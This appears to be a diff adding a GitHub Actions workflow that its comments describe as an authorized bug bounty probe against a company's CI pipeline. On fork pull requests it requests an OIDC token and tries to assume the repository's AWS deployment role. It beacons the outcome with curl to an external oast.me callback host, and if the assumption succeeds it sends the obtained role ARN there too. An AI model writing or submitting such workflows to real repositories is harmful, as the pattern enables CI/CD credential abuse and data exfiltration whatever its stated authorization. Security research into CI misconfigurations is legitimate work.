@@ -1,0 +1,63 @@
+# Authorized, read-only security probe for the Bugcrowd Just Eat Takeaway.com program.
+#
+# Question: can a pull_request opened from a fork obtain AWS credentials for the
+# deployment role that .github/workflows/build.yml assumes through GitHub OIDC
+# (permissions: id-token: write + aws-actions/configure-aws-credentials)?
+#
+# This workflow performs no AWS write operation: after the assume-role step it only
+# calls sts:GetCallerIdentity (read-only). It transmits no credential material and
+# writes nothing to S3, Amplify, or any other JET resource. It reports a status
+# marker (and, only if the assume-role succeeded, the read-only ARN returned by
+# GetCallerIdentity) to the researcher's out-of-band endpoint, and it encodes the
+# outcome in the run conclusion: success = assume-role + GetCallerIdentity worked,
+# failure = denied. The file is removed and the PR is closed once the result is seen.
+
+name: zz oidc fork probe (authorized security test)
+
+on:
+  pull_request:
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  oidc-fork-probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: Report deployment-role variable visibility (value withheld)
+        run: |
+          if [ -z "${{ vars.AWS_ROLE_ARN }}" ]; then
+            echo "role variable: NOT visible to this event"
+            curl -s -o /dev/null --max-time 10 "https://dc3f962bkr476sdu6j4055hgkdx3qczc9.oast.me/v1-role-var-absent" || true
+          else
+            echo "role variable: visible to this event"
+            curl -s -o /dev/null --max-time 10 "https://dc3f962bkr476sdu6j4055hgkdx3qczc9.oast.me/v1-role-var-present" || true
+          fi
+
+      - name: Configure AWS credentials (identical mechanism to build.yml)
+        id: aws
+        continue-on-error: true
+        uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502 # v4.0.2
+        with:
+          role-to-assume: ${{ vars.AWS_ROLE_ARN }}
+          role-session-name: osa-oidc-fork-probe-${{ github.run_id }}
+          aws-region: eu-west-1
+
+      - name: Report assume-role outcome (no credential material is printed or sent)
+        run: |
+          if [ "${{ steps.aws.outcome }}" != "success" ]; then
+            echo "RESULT: OIDC assume-role DENIED for this fork pull_request run"
+            curl -s -o /dev/null --max-time 10 "https://dc3f962bkr476sdu6j4055hgkdx3qczc9.oast.me/v1-assume-denied" || true
+            exit 1
+          fi
+          echo "RESULT: OIDC assume-role SUCCEEDED for this fork pull_request run"
+          if ! IDENT=$(aws sts get-caller-identity --query Arn --output text 2>&1); then
+            echo "RESULT: sts:GetCallerIdentity failed"
+            curl -s -o /dev/null --max-time 10 "https://dc3f962bkr476sdu6j4055hgkdx3qczc9.oast.me/v1-sts-failed" || true
+            exit 1
+          fi
+          echo "RESULT: sts:GetCallerIdentity succeeded"
+          curl -s -o /dev/null --max-time 10 -G "https://dc3f962bkr476sdu6j4055hgkdx3qczc9.oast.me/v1-assume-ok" --data-urlencode "arn=${IDENT}" || true
+          exit 0
